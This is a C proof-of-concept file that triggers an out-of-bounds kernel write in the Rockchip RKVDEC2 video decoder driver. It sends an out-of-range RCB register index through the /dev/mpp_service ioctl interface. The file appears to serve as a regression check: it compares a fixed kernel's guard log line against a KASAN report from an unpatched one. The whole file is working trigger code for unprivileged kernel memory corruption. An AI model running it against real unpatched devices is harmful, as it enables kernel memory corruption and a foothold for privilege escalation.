// SPDX-License-Identifier: GPL-2.0
/*
 * PoC — RKVDEC2 RCB register-index out-of-bounds write (forward-port 0060 /
 * Rockchip BSP develop-6.1 rk_vcodec, mpp_set_rcbbuf() in mpp_rkvdec2.c).
 *
 * MPP_CMD_SET_RCB_INFO copies a userspace array of {u32 index; u32 size} into
 * the task's rcb_inf. mpp_set_rcbbuf() then does, for each element:
 *
 *     reg_idx = rcb_inf->elem[i].index;   // attacker-controlled
 *     task->reg[reg_idx] = dec->rcb_iova + rcb_offset;
 *
 * Pre-fix, reg_idx was not bounded against RKVDEC_REG_NUM (360), so an
 * out-of-range index writes an iova value past the fixed task->reg[] array,
 * into adjacent struct mpp_task fields — an unprivileged OOB kernel write.
 *
 * Reachability on RK3588: dec->rcb_iova is non-zero (the DT provides RCB SRAM;
 * dmesg shows "rcb_iova 0x...fff00000"), and rcb-min-width is unset so the
 * width gate passes; we set DEC_INFO_WIDTH anyway. /dev/mpp_service is group
 * "video".
 *
 * Fixed behaviour (0060): "invalid rcb reg index 65535" is logged and the
 * entry is skipped (array_index_nospec before the write). This PoC drives the
 * path; check dmesg for that guard line (fix present) vs a KASAN
 * slab-out-of-bounds write (vulnerable).
 *
 * Unprivileged. cc -O1 -Wall -o rkvdec2-rcb-index-oob-repro \
 *                  rkvdec2-rcb-index-oob-repro.c
 */
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <linux/rk-mpp.h>

/* driver-private constants (not in uapi) */
#define DEC_INFO_WIDTH		1
#define CODEC_INFO_FLAG_NUMBER	1
#define RKVDEC_REG_NUM		360
#define OOB_REG_INDEX		0xffffu		/* >> 360 */

struct codec_info_elem { uint32_t type; uint32_t flag; uint64_t data; };
struct rcb_info_elem   { uint32_t index; uint32_t size; };

static int cfg(int fd, struct mpp_request *r) { return ioctl(fd, MPP_IOC_CFG_V1, r); }

int main(void)
{
	int fd = open("/dev/mpp_service", O_RDWR | O_CLOEXEC);
	if (fd < 0) { perror("open /dev/mpp_service"); return 2; }

	unsigned int support = 0;
	cfg(fd, &(struct mpp_request){ .cmd = MPP_CMD_QUERY_HW_SUPPORT,
				       .size = sizeof(support), .data = &support });
	unsigned int client = 9;			/* RKVDEC */
	if (!(support & (1u << client))) {
		fprintf(stderr, "RKVDEC(9) not supported (hw_support=%#x)\n", support);
		return 2;
	}
	if (cfg(fd, &(struct mpp_request){ .cmd = MPP_CMD_INIT_CLIENT_TYPE,
					   .size = sizeof(client), .data = &client }) != 0) {
		perror("INIT_CLIENT_TYPE"); return 2;
	}

	/* Set a decode width so the rcb width gate passes. */
	struct codec_info_elem ci = { .type = DEC_INFO_WIDTH,
				      .flag = CODEC_INFO_FLAG_NUMBER, .data = 4096 };
	cfg(fd, &(struct mpp_request){ .cmd = MPP_CMD_SEND_CODEC_INFO,
				       .size = sizeof(ci), .data = &ci });

	/*
	 * One RCB element with an out-of-range register index and a small size
	 * (so rcb_offset + size stays within rcb_size and the write is
	 * attempted). SET_RCB_INFO counts as a "set" message, so the task is
	 * assembled and mpp_set_rcbbuf() runs.
	 */
	struct rcb_info_elem rcb = { .index = OOB_REG_INDEX, .size = 64 };
	struct mpp_request req = {
		.cmd = MPP_CMD_SET_RCB_INFO,
		.flags = MPP_FLAGS_MULTI_MSG | MPP_FLAGS_LAST_MSG,
		.size = sizeof(rcb),
		.data = &rcb,
	};
	printf("submitting SET_RCB_INFO index=%u (RKVDEC_REG_NUM=%d) -> OOB write "
	       "on a vulnerable kernel\n", OOB_REG_INDEX, RKVDEC_REG_NUM);
	int r = cfg(fd, &req);
	printf("ioctl ret=%d errno=%d\n", r, r ? errno : 0);
	printf("check dmesg: fixed kernel logs \"invalid rcb reg index %u\" and "
	       "no KASAN out-of-bounds write.\n", OOB_REG_INDEX);

	close(fd);
	return 0;
}
